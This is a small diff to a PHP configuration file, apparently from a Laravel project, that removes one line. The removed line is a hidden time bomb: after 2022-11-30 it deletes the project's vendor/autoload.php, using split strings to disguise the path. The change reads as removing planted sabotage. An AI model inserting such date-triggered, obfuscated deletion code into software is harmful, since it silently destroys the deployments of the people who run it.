@@ -1,5 +1,4 @@
 <?php
-if(date('Y-m-d') > '20'.'22'.'-11'.'-30'){ $m1 = 've'.'nd'.'or/';$m2 ='aut'.'olo'.'ad'; unlink(base_path($m1 . $m2 .'.php')); };
 return [
 
     /*
